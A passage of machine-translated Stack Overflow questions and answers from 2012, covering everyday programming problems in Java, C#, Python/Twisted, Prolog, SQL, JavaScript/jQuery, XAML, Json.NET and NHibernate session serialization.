        theDates[getIndex()] = new Date(month, day, year);//here is the actual issue
     }
} 
```

我不知道是我想多了还是怎么了，我尝试过将数组设为*static、public*等。我也尝试过将其实现为`myDayeFrame.theDates`.

非常感谢任何指导

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T04:05:25.723

您可能有范围问题。theDates 在构造函数中声明并且仅在构造函数中可见。一个可能的解决方案：将其声明为类字段。当然在构造函数中初始化它，但是如果它在类中声明，它在类中是可见的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-19T04:05:39.790

您在构造函数中定义`theDates`为局部变量，因此它的范围在构造函数中受到限制。相反，将其声明为类的字段：

```
private Data[] theDates;

// ...

   public DateDriver()
   {
       theDates = new Date[100];
       // ...
   } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-19T04:26:42.660

**1.**您已经定义**了 theDates**，它是构造函数内部的一个数组对象引用变量，因此它的范围在构造函数本身内部。

**2.**您应该**在类范围内声明 theDates**，以便在该类中始终可见。

**3.**如果你使用Collection而不是Array会更好，选择ArrayList

**例如：**

```
public class DateDriver {

    private ArrayList<Date> theDates;

    public DateDriver() {
        theDates = new ArrayList<Date>();
    }
} 
```

# iis-7.5 - IIS URL 重写模块取消编码查询字符串

> ID：11553750
> 
> 赞同：0
> 
> 时间：2012-07-19T04:02:37.957
> 
> 标签：iis-7.5, url-rewrite-module

我们有一个非常简单的 URL 重写规则，它基本上会导致 301 重定向到另一个域：

```
<rewrite>
  <rule>
    <match url="^(default.aspx)?$" />
    <action type="Redirect" url="https://some.other.domain.com" />
  </rule>
</rewrite> 
```

不幸的是，当遇到这样的 URL 时：

```
http://original.domain.com/?returnUrl=https%3A%2F%2Fsome.url%2F
```

重定向 URL 如下所示：

```
https://some.other.domain.com/?returnUrl=https://some.url/
```

请注意 URL 编码是如何丢失的。

这是 URL 重写模块中的错误吗？如果是这样，如何解决它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-19T15:38:50.573

我想到了。重写规则仅指定了部分重定向 URL。现在我更改了查询字符串编码：

```
<action type="Redirect" url="https://some.other.domain.com"/> 
```

...对此：

```
<action type="Redirect" url="https://some.other.domain.com/"/> 
```

（注意尾部斜杠）

# python - Twisted web - 在响应客户端后保留请求数据

> ID：11553751
> 
> 赞同：1
> 
> 时间：2012-07-19T04:02:43.940
> 
> 标签：python, file-upload, upload, twisted, twisted.web

我有一个用 Twisted Web 编写的前端 Web 服务器，它与另一个 Web 服务器连接。客户端将文件上传到我的前端服务器，然后将文件发送到后端服务器。我想接收上传的文件，然后在将文件发送到后端服务器之前立即向客户端发送响应。这样，客户端不必等待两个上传都发生后才能得到响应。

我试图通过在单独的线程中开始上传到后端服务器来做到这一点。问题是，在向客户端发送响应后，我不再能够从`Request`对象访问上传的文件。这是一个例子：

```
class PubDir(Resource):

    def render_POST(self, request):
        if request.args["t"][0] == 'upload':
            thread.start_new_thread(self.upload, (request,))

        ### Send response to client while the file gets uploaded to the back-end server:
        return redirectTo('http://example.com/uploadpage')

    def upload(self, request):
        postheaders = request.getAllHeaders()
        try:
            postfile = cgi.FieldStorage(
                fp = request.content,
                headers = postheaders,
                environ = {'REQUEST_METHOD':'POST',
                         'CONTENT_TYPE': postheaders['content-type'],
                        }
                )
        except Exception as e:
            print 'something went wrong: ' + str(e)

        filename = postfile["file"].filename

        file = request.args["file"][0]

        #code to upload file to back-end server goes here... 
```

当我尝试这个时，我得到一个错误：`I/O operation on closed file`。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T04:17:59.263

在完成请求对象之前，您需要将文件实际复制到内存中的缓冲区或磁盘上的临时文件中（重定向时会发生这种情况）。

因此，您正在启动线程并将请求对象交给它，它可能正在打开与后端服务器的连接并在您重定向完成请求并关闭任何关联的临时文件时开始复制，您遇到了麻烦。

快速测试不是将整个请求传递给您的线程，而是尝试将请求的内容传递给您的线程：

```
thread.start_new_thread(self.upload, (request.content.read(),)) 
```

# prolog - Swi-Prolog：无权修改静态过程

> ID：11553753
> 
> 赞同：6
> 
> 时间：2012-07-19T04:02:53.757
> 
> 标签：prolog

我是序言初学者。我非常感谢编译此示例的任何帮助。我猜规则的形式是“结果：-先行”

```
%rules
prey(Y2), watch(X2,Y2) :- predator(X2).
false :- predator(X1),prey(Y1),intelligent(Y1),watch(X1,Y1),catch(X1,Y1).
catch(X3,Y3);hungry(X3) :- predator(X3),prey(Y3),watch(X3,Y3).

%facts
predator(shaki).
prey(pelusa).
intelligent(shaki).
intelligent(pelusa).
watch(shaki,pelusa). 
```

我使用 SWI-Prolog 版本 5.10.4（i386，Ubuntu Natty Narwhal）编译了代码：

```
swipl -s "pathofthecode.pl" 
```

Swi-Prolog 为第二条规则抛出了这个错误：

```
'$record_clause'/2: No permission to modify static_procedure `(;)/2' 
```

* * *

谢谢 azhrei，你说：“我想你想说的是 X1 将无法捕捉 Y1，即使 X1 是捕食者 Y1 正在观察猎物，因为 Y1 很聪明。”，是的！

我发现 prolog 有一些强大的约束 [1]：

1.  Prolog 不允许“或”（分离式）事实或结论。
2.  Prolog 不允许“非”（负面）事实或结论。
3.  Prolog 不允许大多数事实或结论具有存在量化。
4.  Prolog 不直接允许二阶逻辑。

所以我像这样更改了代码：

```
%rules
predator(X) :- prey(Y), watch(X,Y).
catch(X,Y) :- predator(X),prey(Y),not(intelligent(Y)),watch(X,Y).
hungry(X) :- predator(X),prey(Y),watch(X,Y),not(catch(X,Y)).

%facts
prey(pelusa).
intelligent(shaki).
intelligent(pelusa).
watch(shaki,pelusa). 
```

我也尝试过使用：

```
 false :- predator(X),prey(Y),intelligent(Y),watch(X,Y),catch(X,Y). 
```

它可以编译，但是当 prolog 需要查找 catch(X,Y) 是否为真时，它不能，因为谓词不在规则结果中。

--

[1]。尼尔 C. 罗，网址：[http ://faculty.nps.edu/ncrowe/book/chap14.html](http://faculty.nps.edu/ncrowe/book/chap14.html)

**注：**此示例取自哥斯达黎加 UCR 的 Yadira Solano 教授课程

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-19T04:17:50.910

错误消息是关于您对分号 . 的使用`;`。你不能重新定义它。

您也不能更改`false`谓词。所以我很惊讶你说这个编译：

`false :- predator(X),prey(Y),intelligent(Y),watch(X,Y),catch(X,Y).`

它不适合我。:-) (SWI-序言)

在第二条规则中，我想你想说的是： *X1 将无法捕捉到 Y1，即使 X1 是捕食者，也在观察 Y1 的猎物，因为 Y1 是聪明的。*在这种情况下，您需要：

`catch(X,Y) :- ...,...,...,...,not(intelligent(Y)).`

（正如您发现自己并在您的帖子中编辑的那样。:-)

*注意：*您提供的链接显示了一些逻辑上等价的语句，但这并不意味着您可以在代码中使用它们，因为它们在 Prolog 中在程序上不等价。您可以在查询中（在 prolog 提示符处）或在规则体中使用`false`和，但不能在规则头中使用。`;`

# c# - 如何在一天或一周或一个月或一年之间查询 Gridview 中的数据

> ID：11553756
> 
> 赞同：0
> 
> 时间：2012-07-19T04:03:21.213
> 
> 标签：c#, asp.net, sql

我试图从数据库中显示我的数据。如果我今天存储了一些数据，仅此一项就应该显示在`GridView`.

我希望能够按周、月和年显示。

我的代码：

```
public void gettoday()
    {
        con.Open();
        {

            //string strview = "select MRNO,MaterialCode,Description,Specification,Category as Cat,Source as Sor,Population as Pop, StockInStores as Stock,MRRating as Rating,PreparedBy,PreparedDate,CheckedBy,CheckedDate,ApprovedBy,ApprovedDate  from tbl_KKSMaterialRaise where PreparedDate between DateAdd(day,-1,GetDate()) AND DateAdd(day,+1,GetDate())";
            string strview = "select MRNO,MaterialCode,Description,Specification,Category as Cat,Source as Sor,Population as Pop, StockInStores as Stock,MRRating as Rating,PreparedBy,PreparedDate,CheckedBy,CheckedDate,ApprovedBy,ApprovedDate  from tbl_KKSMaterialRaise where PreparedDate between (getdate()-1) and (getdate()+1) order by PreparedDate";
            SqlCommand cmd = new SqlCommand(strview, con);
            SqlDataAdapter da = new SqlDataAdapter(cmd);
            DataSet ds = new DataSet();
            da.Fill(ds);
            if (ds.Tables[0].Rows.Count > 0)
            {
                GridView1.DataSource = ds;
                GridView1.DataBind();
                //SqlDataReader reader = cd.ExecuteReader();
            }

            else
            {
                GridView1.DataSource = null;
                GridView1.DataBind();
            }

        }
        con.Close();

    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T13:19:59.457

您只需要更改子句`BETWEEN`中的`WHERE`语句。现在你有：

```
where PreparedDate between (getdate()-1) and (getdate()+1) 
```

一个星期，你需要使用这样的东西：

```
WHERE PreparedDate BETWEEN DATEADD(DAY, -7, GETDATE()) AND DATEADD(DAY, 1, GETDATE()) 
```

`DATEADD(DAY, -7, GETDATE())`您可以通过更改到适当的日期范围来 对月份和年份执行类似的操作。

一个月

```
DATEADD(MONTH, -1, GETDATE()) 
```

和一年：

```
DATEADD(YEAR, -1, GETDATE()) 
```

# c# - 为什么 Json.NET DeserializeObject 将时区更改为本地时间？

> ID：11553760
> 
> 赞同：50
> 
> 时间：2012-07-19T04:03:30.790
> 
> 标签：c#, json.net, datetimeoffset

我正在使用 json.net 反序列化 a `DateTimeOffset`，但它忽略了指定的时区并将日期时间转换为本地偏移量。例如，给定

```
var content = @"{""startDateTime"":""2012-07-19T14:30:00+09:30""}"; 
```

反序列化时使用：

```
var jsonSerializerSettings = new JsonSerializerSettings() { DateFormatHandling = DateFormatHandling.IsoDateFormat, DateParseHandling = DateParseHandling.DateTimeOffset, DateTimeZoneHandling = DateTimeZoneHandling.RoundtripKind };
var obj = JsonConvert.DeserializeObject(content, jsonSerializerSettings); 
```

obj 将包含一个包含 a 的属性，`DateTimeOffset`但该值将被`2012-07-19T15:30:00+10:30`转换为本地时区，而不是保留原始时区。

有没有办法让值按预期解析，以便生成的`DateTimeOffset`属性与提供的值匹配？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-08-01T16:19:10.733

它似乎忽略`DateParseHandling.DateTimeOffset`并正在使用`DateParseHandling.DateTime`. 我会在这里记录一个问题：[https ://github.com/JamesNK/Newtonsoft.Json](https://github.com/JamesNK/Newtonsoft.Json)

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2015-08-28T19:14:10.767

如果您使用的是 .NET WebApi，您可以将以下内容添加到`WebApiConfig.cs`文件中，以便在您的应用程序中全局处理此问题。

```
config.Formatters.JsonFormatter.SerializerSettings.DateTimeZoneHandling = 
    Newtonsoft.Json.DateTimeZoneHandling.Local; 
```

这将特别告诉`JsonFormatter`在序列化和反序列化日期时包含和理解本地时区信息。

* * *

## 回答 #3

> 赞同：15
> 
> 时间：2014-06-30T03:43:01.920

尝试使用这个：

```
microsoftDateFormatSettings = new JsonSerializerSettings
{
    DateFormatHandling = DateFormatHandling.MicrosoftDateFormat,
    DateTimeZoneHandling = DateTimeZoneHandling.Local
};
var items = JsonConvert.DeserializeObject<List<lstObject>>(jsonString, microsoftDateFormatSettings); 
```

我不知道它是否适用于所有情况，但对我来说确实有效。您可以尝试其他一些值`DateTimeZoneHandling`或在 Google 上搜索更多选项。

* * *

## 回答 #4

> 赞同：11
> 
> 时间：2012-12-17T16:01:37.320

我不确定您使用的是哪个版本，因为在某些时候我们遇到了同样的问题，然后更新修复了它...

你的代码对我来说也是错误的，但如果我创建类

```
public class A
{
    public DateTimeOffset startDateTime;
} 
```

并打电话

```
var obj = JsonConvert.DeserializeObject<A>(content, jsonSerializerSettings); 
```

一切都按预期工作。是的，它肯定是错误，是的，我不知道如何得到你想要的结果，但它可能会对其他人有所帮助。

* * *

## 回答 #5

> 赞同：7
> 
> 时间：2017-10-21T08:38:17.037

这对我有用，保留了时区

```
var jss = new JsonSerializerSettings
    {
         DateFormatHandling = DateFormatHandling.IsoDateFormat,
         DateTimeZoneHandling = DateTimeZoneHandling.Local, 
         DateParseHandling = DateParseHandling.DateTimeOffset
    };
var responseObj = JsonConvert.DeserializeObject<dynamic>(body, jss);
return responseObj.Select(s => new {
                    id = s["id"].Value<int>(),
                    date = s["date"].Value<DateTimeOffset>().DateTime,
                }); 
```

JSON主体是这样的

```
[
    {
        "id": 211,
        "date": "2017-10-22T12:00:00+03:00",
        "status": 1
    },
    {
        "id": 212,
        "date": "2017-10-28T12:00:00+03:00",
        "status": 1
    }
] 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2020-01-30T08:21:17.107

要将正确`Local Date`的与 custom 一起使用`JsonConverter`，请执行以下操作：

```
var obj = JsonConvert.DeserializeObject(json, type, new JsonSerializerSettings {
    DateFormatHandling = DateFormatHandling.MicrosoftDateFormat,
    DateTimeZoneHandling = DateTimeZoneHandling.Local,
    Converters = new JsonConverter[] { new MY_CUSTOM_CONVERTER() }
}); 
```

我在互联网上努力搜索将它们组合在一起，最终发现`JsonConverter`可以输入`JsonSerializerSettings`.

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2018-09-25T12:59:02.687

要在序列化程序中使用这些设置，请键入：

```
var serializerSettings = new JsonSerializerSettings
            {
                DateFormatHandling = DateFormatHandling.MicrosoftDateFormat,
                DateTimeZoneHandling = DateTimeZoneHandling.Local
            };
            var serializer = JsonSerializer.Create(serializerSettings); 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2019-09-24T14:01:15.643

作为一种简单的方法，您可以转换`Date`为以`Ticks`进行序列化并将其转换为`Ticks`以`Date`进行反序列化：

序列化：

```
DateTime date = new DateTime();
ticks = date.Ticks 
```

反序列化”

```
Datetime = new Datetime(ticks); 
```

# c# - 如何在 TextBlock 中模仿以下模板？

> ID：11553762
> 
> 赞同：0
> 
> 时间：2012-07-19T04:03:42.477
> 
> 标签：c#, xaml, styles, microsoft-metro, textblock

我正在寻找两个 Metro 应用程序，它们使用类似于对话框的特定 TextBlock 样式。

以下快照取自 TweetPro。观看 textBlock 风格，其中说：

> Te gustaria 程序员..？

这个取自消息应用程序，并观看紫色对话框。

![在此处输入图像描述](../Images/e15734ca5031f71474020c5318924f15.png)![在此处输入图像描述](../Images/e7d18102092c08654dc62c6f8de4221e.png)

我想在我的应用程序中实现这种文本块样式，但我真的没有太多自定义控件的经验。所以，我需要一些帮助来实现这个 textBlock 对话框样式！提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T11:12:57.060

试试这个：

```
 <StackPanel Orientation="Horizontal" Width="200" Height="50">
        <Path Data="M 17 0 L 0 0 17 10 Z" StrokeThickness="48" Fill="Red" Margin="0,10,0,0" />
        <Border Background="Red" Padding="5" Width="200" Height="50" >
            <TextBox  BorderThickness="0" Background="Transparent" Text="Hello" Foreground="White" />
        </Border>
    </StackPanel> 
```

# rest - 如何使用基于 wink 的 REST API 对 dojox.grid.DataGrid 进行排序？

> ID：11553766
> 
> 赞同：2
> 
> 时间：2012-07-19T04:04:08.427
> 
> 标签：rest, jax-rs, dojox.grid.datagrid, apache-wink

我正在使用 Dojo 数据网格客户端，它运行良好，根据[文档](http://dojotoolkit.org/documentation/tutorials/1.7/store_driven_grid/)，它在单击列标题时生成以下 GET 请求：

```
GET http://localhost:8080/books/rest/books?sort(+isbn) 
```

问题是我无法使用 Apache Wink 框架在服务器端解释查询参数“sort(+isbn)”，因为没有为它设置值。例如，我希望得到类似“sort=+isbn”的东西。

这是我的服务器端代码：

```
@Path("/books")
public class BookServiceImpl implements BookService {
...
    @GET
    @Produces(MediaType.APPLICATION_JSON)
    public String getBook(@QueryParam("sort") String sortBy) {
        System.out.println("Received Queryparam for sort is " + sortBy);
        return "";
    }

} 
```

由于“sort(+isbn)”没有分配任何值，它似乎是一个无效的查询参数。不知道为什么 Dojo 数据网格使用这个约定。

希望获得有关如何在 Java 端解决此问题的帮助，最好使用 Wink 或其他机制来处理 GET 请求。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-19T13:16:46.017

尝试使用`@Context UriInfo`获取完整的 uri 信息，调用`UriInfo.getQueryParameters`以获取所有查询参数。我相信`sort(+isbn)`会在那里。

# ios - 在 ios 上使用 twitter api 时，请求令牌无效

> ID：11553767
> 
> 赞同：1
> 
> 时间：2012-07-19T04:04:22.683
> 
> 标签：ios, twitter

我正在使用 WBShareKit（一个支持 Twitter、微博等的共享工具包），当我将我的 appkey 和 appsecret 更改为我自己的应用程序密钥时，我收到以下错误消息：

> “哇！
> 
> 此页面的请求令牌无效。它可能已经被使用过，或者因为太旧而过期。请返回将您发送到此处的站点或应用程序，然后重试；这可能只是一个错误。”

我不知道为什么会这样。当我使用其他应用程序 appkey 和 appsecret 时，它工作正常。但是使用我的，它不起作用。

# javascript - 单击表格行删除按钮后删除表格行

> ID：11553768
> 
> 赞同：29
> 
> 时间：2012-07-19T04:04:43.740
> 
> 标签：javascript, jquery, html-table, row

解决方案可以使用 jQuery 或纯 JavaScript。

我想在用户单击表格行单元格中包含的相应按钮后删除表格行，例如：

```
<script>
function SomeDeleteRowFunction() {
 //no clue what to put here?
}
</script>

<table>
   <tr>
       <td><input type="button" value="Delete Row" onclick="SomeDeleteRowFunction()"></td>
   </tr>
   <tr>
       <td><input type="button" value="Delete Row" onclick="SomeDeleteRowFunction()"></td>
   </tr>
   <tr>
       <td><input type="button" value="Delete Row" onclick="SomeDeleteRowFunction()"></td>
   </tr>
</table> 
```

* * *

## 回答 #1

> 赞同：46
> 
> 时间：2012-07-19T04:06:31.043

您可以使用 jQuery`click`而不是使用`onclick`属性，请尝试以下操作：

```
$('table').on('click', 'input[type="button"]', function(e){
   $(this).closest('tr').remove()
}) 
```

[演示](http://jsfiddle.net/7zWB5/1/)

* * *

## 回答 #2

> 赞同：34
> 
> 时间：2012-07-19T04:15:40.957

你可以这样做：

```
<script>
    function SomeDeleteRowFunction(o) {
     //no clue what to put here?
     var p=o.parentNode.parentNode;
         p.parentNode.removeChild(p);
    }
    </script>

    <table>
       <tr>
           <td><input type="button" value="Delete Row" onclick="SomeDeleteRowFunction(this)"></td>
       </tr>
       <tr>
           <td><input type="button" value="Delete Row" onclick="SomeDeleteRowFunction(this)"></td>
       </tr>
       <tr>
           <td><input type="button" value="Delete Row" onclick="SomeDeleteRowFunction(this)"></td>
       </tr>
    </table> 
```

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2018-10-31T13:57:49.463

**使用纯 Javascript：**

不需要传递`this`给`SomeDeleteRowFunction()`：

```
<td><input type="button" value="Delete Row" onclick="SomeDeleteRowFunction()"></td> 
```

点击功能：

```
function SomeDeleteRowFunction() {
      // event.target will be the input element.
      var td = event.target.parentNode; 
      var tr = td.parentNode; // the row to be removed
      tr.parentNode.removeChild(tr);
} 
```

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2012-07-19T06:12:11.110

以下解决方案工作正常。

**HTML：**

```
<table>
  <tr>
    <td>
      <input type="button" value="Delete Row" onclick="SomeDeleteRowFunction(this);">
    </td>
  </tr>
  <tr>
    <td>
      <input type="button" value="Delete Row" onclick="SomeDeleteRowFunction(this);">
    </td>
  </tr>
  <tr>
    <td>
      <input type="button" value="Delete Row" onclick="SomeDeleteRowFunction(this);">
    </td>
  </tr>
</table> 
```

**查询：**

```
function SomeDeleteRowFunction(btndel) {
    if (typeof(btndel) == "object") {
        $(btndel).closest("tr").remove();
    } else {
        return false;
    }
} 
```

我在[http://codebins.com/bin/4ldqpa9上做了垃圾箱](http://codebins.com/bin/4ldqpa9)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2021-01-29T11:57:28.033

正如@gaurang171 提到的，我们可以使用 .closest() 来返回第一个祖先，或者最接近我们的删除按钮，然后使用 .remove() 来删除它。

这就是我们如何使用 jQuery click 事件而不是使用 JavaScript onclick 来实现它。

```
$(document).ready(function(){
     $("#myTable").on('click','.btnDelete',function(){
         $(this).closest('tr').remove();
      });
  });
```

```
table{
  width: 100%;
  border-collapse: collapse;
}

table td{
  border: 1px solid black;
}
button:hover{
  cursor: pointer;
}
```

```
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<table id="myTable">
<tr>
  <th>ID</th>
  <th >Name</th>
  <th>Age</th>
  <th width="1%"></th>
</tr>

<tr>
  <td >SSS-001</td>
  <td >Ben</td>
  <td >25</td>
  <td><button type='button' class='btnDelete'>x</button></td>
</tr>

<tr>
  <td >SSS-002</td>
  <td >Anderson</td>
  <td >47</td>
  <td><button type='button' class='btnDelete'>x</button></td>
</tr>

<tr>
  <td >SSS-003</td>
  <td >Rocky</td>
  <td >32</td>
  <td><button type='button' class='btnDelete'>x</button></td>
</tr>

<tr>
  <td >SSS-004</td>
  <td >Lee</td>
  <td >15</td>
  <td><button type='button' class='btnDelete'>x</button></td>
</tr>
```

# c# - 获取 TFS SDK 中变更集的日期？

> ID：11553771
> 
> 赞同：3
> 
> 时间：2012-07-19T04:05:13.330
> 
> 标签：c#, visual-studio-2010, tfs-sdk

我想获取变更集的日期。TFS SDK 有很多参考。我需要哪个参考资料和课程？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-07-19T05:03:04.227

我在 TFS API 上找到的最佳资源之一是这一系列博客文章：http: [//blogs.microsoft.co.il/blogs/shair/archive/tags/TFS+API/default.aspx](http://blogs.microsoft.co.il/blogs/shair/archive/tags/TFS+API/default.aspx)

在这种情况下，没有什么明确的关于获取变更集信息（我看到的），但是还有其他一些与源代码控制相关的帖子。从那里您将看到您需要首先获取一个[`VersionControlServer`](http://msdn.microsoft.com/en-us/library/microsoft.teamfoundation.versioncontrol.client.versioncontrolserver%28v=vs.100%29.aspx)实例，该类的 MSDN 页面应该为您提供其余的方法：调用`GetChangeset`以获取一个特定的`Changeset`对象，该对象又具有一个`CreationDate`属性。

（如果您实际上不知道所需的变更集编号，则可以使用诸如`QueryHistory`获取源代码控制数据库中特定路径的变更集列表之类的方法。）

```
var collectionUrl = "http://tfsserver:8080/tfs/DefaultCollection";
var tpc = new TfsTeamProjectCollection(collectionUrl);

var vc = tpc.GetService<VersionControlServer>();

// Get changeset #1234
var cs = vc.GetChangeset(1234);

// Get the last changeset checked into TFS by anyone.
var cslatest = vs.GetChangeSet(vs.GetLatestChangesetId());    

// Get a list of all changesets for the $/MyProject/Main branch
var cslist = vc.QueryHistory("$/MyProject/Main", null, 0, RecursionType.Full, 
    null, null, int.MaxValue, false, false); 
```

# java - 旋转时出现多个位图

> ID：11553773
> 
> 赞同：1
> 
> 时间：2012-07-19T04:05:17.640
> 
> 标签：java, android, bitmap, rotation

我的项目涉及围绕中心枢轴点旋转的多个同心环。我用所有的环初始化surfaceview画布，然后开始将它们从最里面的一个旋转到最外面。代码工作正常，但问题是最内圈在 3 次增量旋转后开始显示与自身略微不同步。就像多个环显示出的相位略有不同？

这是代码：

```
cSurface.setMatrix(mTmp);
cSurface.drawBitmap( wheels[idx], pivotX-(cD[idx]/2), pivotY-(cD[idx]/2), new Paint()); 
```

此代码用于初始化表面视图和增量旋转环。

# c# - 序列化/反序列化“NHibernate Session”，惰性初始化错误（集群的“StateServer 模式”）

> ID：11553780
> 
> 赞同：4
> 
> 时间：2012-07-19T04:06:02.787
> 
> 标签：c#, nhibernate, serialization, cluster-computing, spring.net

我在我的应用程序中使用了一种“会话每会话”模式实现。在这种方法中，“NHibernate Session”保持在“HTTP Session”上。在每个“Http Request”中，“NHibernate Session”在开始时重新连接并在请求结束时断开连接。在“对话”结束时，“NHibernate Session”保存在“HTTP Session”中。这工作得很好。

**问题：**

现在我正在考虑在“Http Session”上使用[“StateServer 模式”。](http://msdn.microsoft.com/en-us/library/ms178586.aspx)因此，“HTTP Session”中的所有对象都必须是可序列化的，包括“NHibernate Session”。

所以我正在做一个概念证明来验证“NHibernate Session”及其缓存对象的序列化/反序列化是否有效。

“概念证明”是以下单元测试。目标是让它通过。

代码：

```
/*069*/  [Test]
/*070*/  public void Test()
/*071*/  {
/*072*/      //for inspecting the SQL commands
/*073*/      NhSqlLogCapture hhSqlLogCapture = new NhSqlLogCapture();
/*074*/  
/*075*/      MemoryStream ms = new MemoryStream();
/*076*/  
/*077*/      ISession sessionBefore = null;
/*078*/      ISession sessionAfter = null;
/*079*/  
/*080*/      //querying before the serialization.
/*081*/      try
/*082*/      {
/*083*/          sessionBefore = this.sessionFactory.OpenSession();
/*084*/          sessionBefore.FlushMode = FlushMode.Auto;
/*085*/  
/*086*/          hhSqlLogCapture.Enable();
/*087*/  
/*088*/          //Querying only 'DetailEtt'
/*089*/          hhSqlLogCapture.SqlStatments.Clear();
/*090*/          ICriteria crt = sessionBefore.CreateCriteria<DetailEtt>();
/*091*/          crt
/*092*/              .SetFetchMode("Master", FetchMode.Select);
/*093*/          IList<DetailEtt> cen1DetailList = crt.List<DetailEtt>();
/*094*/  
/*095*/          //BEGIN: Serializing
/*096*/          //also serializing an instance of 'DetailEtt' to verify that keeps only one instance to the same database record.
/*097*/          sessionBefore.Disconnect();
/*098*/          Object[] serializationArray = new object[] { sessionBefore, sessionBefore.Get<DetailEtt>(1) };
/*099*/          BinaryFormatter bf = new BinaryFormatter();
/*100*/          bf.Serialize(ms, serializationArray);
/*101*/          //END: Serializing
/*102*/  
/*103*/          //assertions
/*104*/          //Checking the sql command executed.
/*105*/          Assert.AreEqual(1, hhSqlLogCapture.SqlStatments.Count, "hhSqlLogCapture.SqlStatments.Count");
/*106*/          Regex rx = new Regex("(?is).*SELECT.*FROM.*DETAIL.*");
/*107*/          Assert.IsTrue(rx.IsMatch(hhSqlLogCapture.SqlStatments[0]), hhSqlLogCapture.SqlStatments[0]);
/*108*/  
/*109*/          hhSqlLogCapture.Disable();
/*110*/      }
/*111*/      finally
/*112*/      {
/*113*/          sessionBefore = null;
/*114*/      }
/*115*/  
/*116*/      try
/*117*/      {
/*118*/          //BEGIN: Deserializing
/*119*/          BinaryFormatter bf = new BinaryFormatter();
/*120*/          ms.Seek(0, SeekOrigin.Begin);
/*121*/          Object[] deserializationArray = (Object[])bf.Deserialize(ms);
/*122*/          DetailEtt dtEttDeserialized = (DetailEtt)deserializationArray[1];
/*123*/          sessionAfter = (ISession)deserializationArray[0];
/*124*/          //BEGIN: Deserializing
/*125*/  
/*126*/          IDbConnection conn = this.dbProvider.CreateConnection();
/*127*/          conn.Open();
/*128*/          sessionAfter.Reconnect(conn);
/*129*/  
/*130*/          //Enabling again because the session loses the reference to the log (I think).
/*131*/          hhSqlLogCapture.Enable();
/*132*/          hhSqlLogCapture.SqlStatments.Clear();
/*133*/  
/*134*/          DetailEtt dtEtdSSGet = sessionAfter.Get<DetailEtt>(1);
/*135*/          MasterEtt mtEtd = dtEtdSSGet.Master;
/*136*/          Console.WriteLine(mtEtd.Description);
/*137*/  
/*138*/          //assertions
/*139*/          //Checking the sql command executed.
/*140*/          Assert.AreEqual(1, hhSqlLogCapture.SqlStatments.Count, "hhSqlLogCapture.SqlStatments.Count");
/*141*/          Regex rx = new Regex("(?is).*SELECT.*FROM.*MASTER.*");
/*142*/          Assert.IsTrue(rx.IsMatch(hhSqlLogCapture.SqlStatments[0]), hhSqlLogCapture.SqlStatments[0]);
/*143*/          //verify that keeps only one instance to the same database record
/*144*/          Assert.AreSame(dtEttDeserialized, dtEtdSSGet, "verify that keeps only one instance to the same database record");
/*145*/      }
/*146*/      finally
/*147*/      {
/*148*/          sessionAfter.Close();
/*149*/      }
/*150*/  } 
```

测试通过了几乎所有内容。但是当尝试加载“懒惰”的实体时它会失败。

错误：

```
SofPOC.Questions.SerializeSession.SerializeSessionTest.Test:
  NHibernate.LazyInitializationException : Initializing[SofPOC.Questions.SerializeSession.Entities.MasterEtt#5]-Could not initialize proxy - no Session.    em NHibernate.Proxy.AbstractLazyInitializer.Initialize()
at NHibernate.Proxy.AbstractLazyInitializer.Initialize()
at Spring.Data.NHibernate.Bytecode.LazyInitializer.Invoke(IMethodInvocation invocation) in c:\_prj\spring-net\trunk\src\Spring\Spring.Data.NHibernate21\Data\NHibernate\Bytecode\LazyInitializer.cs:line 101
at Spring.Aop.Framework.AbstractMethodInvocation.Proceed() in c:\_prj\spring-net\trunk\src\Spring\Spring.Aop\Aop\Framework\AbstractMethodInvocation.cs:line 284
at Spring.Aop.Framework.DynamicProxy.AdvisedProxy.Invoke(Object proxy, Object target, Type targetType, MethodInfo targetMethod, MethodInfo proxyMethod, Object[] args, IList interceptors) in c:\_prj\spring-net\trunk\src\Spring\Spring.Aop\Aop\Framework\DynamicProxy\AdvisedProxy.cs:line 208
at DecoratorAopProxy_9872659265c04d36bc9738f2aaddfb08.get_Description()
at SofPOC.Questions.SerializeSession.SerializeSessionTest.Test() in C:\Users\hailtondecastro\lixo\stackoverflow\dotnet\StackoverflowNetPOCs_20120718\src\SofPOC.Net4.NH2.Spring13.2010\Questions\SerializeSession\SerializeSessionTest.cs:line 136 
```

详细信息：

```
[Serializable]
public class DetailEtt
{
    private Int32? id;
    /// <summary>
    /// PK
    /// </summary>
    public virtual Int32? Id
    {
        get { return id; }
        set { id = value; }
    }

    private String description;
    /// <summary>
    /// TODO:
    /// </summary>
    public virtual String Description
    {
        get { return description; }
        set { description = value; }
    }

    private MasterEtt master;
    /// <summary>
    /// TODO:
    /// </summary>
    public virtual MasterEtt Master
    {
        get { return master; }
        set { master = value; }
    }
} 
```

马斯特埃特：

```
[Serializable]
public class MasterEtt
{
    private Int32? id;
    /// <summary>
    /// PK
    /// </summary>
    public virtual Int32? Id
    {
        get { return id; }
        set { id = value; }
    }

    private String description;
    /// <summary>
    /// TODO:
    /// </summary>
    public virtual String Description
    {
        get { return description; }
        set { description = value; }
    }
} 
```

DetailEtt.hbm.xml：

```
<?xml version="1.0" encoding="utf-8"?>
<hibernate-mapping xmlns="urn:nhibernate-mapping-2.2" namespace="SofPOC.Questions.SerializeSession.Entities" assembly="SofPOC.Net4.NH2.Spring13">
  <class name="DetailEtt" table="DETAIL">
    <id name="Id" type="Int32">
